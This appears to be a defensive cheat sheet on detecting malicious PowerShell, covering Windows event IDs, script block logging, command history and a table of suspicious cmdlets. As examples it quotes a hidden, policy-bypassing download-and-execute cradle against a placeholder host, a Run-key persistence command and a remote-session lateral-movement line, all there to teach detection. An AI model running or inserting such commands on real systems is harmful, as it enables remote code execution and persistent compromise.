PowerShell commands and objectives

ObjectiveCommandExplanation
Executionpowershell -w hidden -ep bypass -nop -c "IEX ((New-Object System.Net.Webclient).DownloadString('http://soctest.xyz/malware.ps1'))"-w hidden (Hides the command window) -ep bypass (Bypasses execution policy) -nop (Prevents PowerShell from loading user profiles) -c (Executes the command in PowerShell) IEX (Invoke-Expression) (Executes a string as a command, commonly used for malicious purposes) New-Object System.Net.WebClient.DownloadString (Downloads content from a URL into a string variable)
PersistenceNew-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name "socmalware" -Value "C:\Windows\temp\volnaf.exe"New-ItemProperty (Creates a new registry entry) -Path (Defines the registry path for persistence) -PropertyType String (Specifies the type of registry value) -Name "socmalware" (Name of the registry entry) -Value "C:\Windows\temp\volnaf.exe" (Executable that will run on system startup)
Lateral MovementEnter-PSSession -ComputerName 10.10.0.2 -Credential $credentialsEnter-PSSession (Initiates a remote PowerShell session) -ComputerName (Specifies the target machine for remote execution) -Credential (Passes login credentials for authentication)

Key PowerShell Event IDs

Event IDLog FileDescription
4688SecurityLogs the execution of a PowerShell process and its command-line arguments.
800Windows PowerShellRecords any PowerShell command execution via the console. Enabled by default in all PowerShell versions.
4103Microsoft-Windows-PowerShell/OperationalLogs executed PowerShell modules and cmdlets.
4104Microsoft-Windows-PowerShell/OperationalLogs entire executed PowerShell script blocks (enabled by default for suspicious activities).

PowerShell Script Block Logging (Event ID 4104)

  • Introduced in PowerShell v5.
  • Logs full executed script content, even if logging is disabled.
  • If a script is too long, multiple event logs are created with the same ScriptBlock ID, allowing reconstruction.
  • Helpful in investigating PowerShell-based attacks, including fileless malware.

Reconstructing PowerShell Scripts from Logs

  • Manually copy and arrange logs with the same ScriptBlock ID.
  • Use automated scripts like ExtractAllScripts.ps1 (GitHub Link).

Additional PowerShell Execution Logging Features

FeatureDescriptionLocation
PSReadLineStores PowerShell command history.C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
TranscriptsCaptures PowerShell session input, output, and errors.Enabled via Start-Transcript (output stored in the user's Documents folder).

Suspicious PowerShell Commands & Cmdlets

Command/ArgumentDescription
-NonInteractive (-noni)Runs PowerShell without an interactive prompt.
DownloadStringFetches content from a remote URI.
DownloadFileDownloads a file from a remote URI.
-ExecutionPolicy (-ep)Used to bypass PowerShell execution policies (Bypass or Unrestricted).
-EncodedCommand (-e, -enc)Executes base64-encoded PowerShell commands to evade detection.
Invoke-CommandExecutes commands on remote systems.
Enter-PSSessionEstablishes a remote interactive PowerShell session.
Invoke-WebRequestDownloads files from remote servers (often used in malware delivery).

Example of Fileless PowerShell Malware

powershell
powershell.exe -ep bypass -nop -noexit -c iex ((New-Object Net.WebClient).DownloadString('http://soctest.xyz/malware.ps1'))
  • Event ID 800 logs the execution of the command.
  • Event ID 4104 captures the full content of the executed script block.

Enabling PowerShell Script Block Logging via Group Policy

  1. Open Group Policy Editor (gpedit.msc).
  2. Navigate to:

    3. Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell

  3. Enable "Turn on PowerShell Script Block Logging".
